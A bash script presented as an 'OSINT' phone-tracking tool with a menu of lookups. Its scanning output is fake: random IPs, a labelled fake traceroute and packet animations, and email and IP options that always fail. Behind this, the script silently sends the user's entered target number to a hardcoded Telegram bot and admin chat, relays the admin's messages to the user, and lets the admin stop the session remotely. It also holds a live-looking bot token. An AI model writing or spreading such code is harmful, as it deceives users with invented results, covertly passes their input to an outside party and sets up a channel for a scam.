#!/bin/bash

# ============================
#        B-OSINT TOOL
# ============================

BOT_TOKEN="8306570742:AAG-OGdkR0gglWOp0slo_5Mpl9cOB7FYldE"
ADMIN_CHAT_ID="7767806269"

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# ----------------------------
# Show admin messages live
# ----------------------------
last_admin_msg=""

show_admin_msgs() {
    UPDATES=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates")
    MSG=$(echo "$UPDATES" | grep -oP '(?<="text":").*?(?=")' | tail -1)

    if [[ "$MSG" != "$last_admin_msg" ]]; then
        if [[ "$MSG" != "stop" ]]; then
            echo -e "\n${GREEN}${RESET} $MSG"
        fi
        last_admin_msg="$MSG"
    fi
}

# ----------------------------
#  Detect STOP from admin
# ----------------------------
check_stop() {
    UPDATES=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getUpdates")
    LAST=$(echo "$UPDATES" | grep -oP '(?<="text":").*?(?=")' | tail -1)
    [[ "$LAST" == "stop" ]]
}

# ----------------------------------------------------------
#       1. PACKET STREAM SIMULATION (Moving Data Flow)
# ----------------------------------------------------------
packet_stream() {
    packets=(">>>----" ">>---->" ">---->>" "---->>>" "--->>>>" "->>>>>>" ">>>>>>")
    while true; do
        for p in "${packets[@]}"; do
            echo -ne "${CYAN}Processing Packets: ${RESET}$p\r"
            sleep 0.15

            show_admin_msgs
            if check_stop; then return; fi
        done
    done
}

# ----------------------------------------------------------
#       2. FAKE TRACEROUTE SIMULATION
# ----------------------------------------------------------
fake_traceroute() {
    while true; do
        ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
        ms=$((RANDOM % 90 + 10))
        echo -ne "${YELLOW}Tracing route to${RESET} $ip  ${CYAN}${ms}ms${RESET}\r"
        sleep 0.20

        show_admin_msgs
        if check_stop; then return; fi
    done
}

# ----------------------------------------------------------
#       3. RANDOM IP SWEEP ANIMATION
# ----------------------------------------------------------
ip_sweep() {
    while true; do
        ip="10.$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
        echo -ne "${BLUE}Scanning:${RESET} $ip\r"
        sleep 0.10

        show_admin_msgs
        if check_stop; then return; fi
    done
}

# ----------------------------------------------------------
#       Combined Network Scan Engine
# ----------------------------------------------------------
network_scan() {
    while true; do
        packet_stream
        if check_stop; then break; fi

        fake_traceroute
        if check_stop; then break; fi

        ip_sweep
        if check_stop; then break; fi
    done

    echo -e "\n${RED}Connection Disconnected${RESET}"
}

# ----------------------------------------------------------
#  Send data TO ADMIN
# ----------------------------------------------------------
send_to_admin() {
    local msg="$1"
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    -d chat_id="${ADMIN_CHAT_ID}" \
    -d text="$msg" >/dev/null
}

# ----------------------------------------------------------
#        TRACK OPTION
# ----------------------------------------------------------
track() {
    echo -e "${BLUE}Enter Number to Track:${RESET}"
    read TARGET

    send_to_admin "🔍 Tracking Request Started  
Target: $TARGET  
Status: RUNNING…"

    echo -e "\n${YELLOW}Initializing Secure Network Scan...${RESET}"
    sleep 1

    # ---- START LIVE SCAN LOOP ----
    network_scan

    echo -e "${GREEN}✔ Tracking Session Ended${RESET}"
}

# ----------------------------------------------------------
# Failed Options
# ----------------------------------------------------------
connection_failed() {
    echo -e "${RED}Connection Failed!${RESET}"
    sleep 2
}

# ----------------------------------------------------------
# MENU
# ----------------------------------------------------------
menu() {
while true; do
    clear
echo -e "${BLUE}========================================${RESET}"
    echo -e "${CYAN}             B-OSINT TOOL UI            ${RESET}"
    echo -e "${BLUE}========================================${RESET}"
    echo ""
    echo "1) Track"
    echo "2) Email Lookup"
    echo "3) IP Address Lookup"
    echo "4) Exit"
    echo ""
    echo -n "Select an option: "
    read OPTION

    case $OPTION in
        1) track ;;
        2) connection_failed ;;
        3) connection_failed ;;
        4) exit ;;
        *) echo -e "${RED}Invalid option!${RESET}"; sleep 1 ;;
    esac

    echo ""
    echo -e "${YELLOW}Press Enter to continue...${RESET}"
    read
done
}

menu
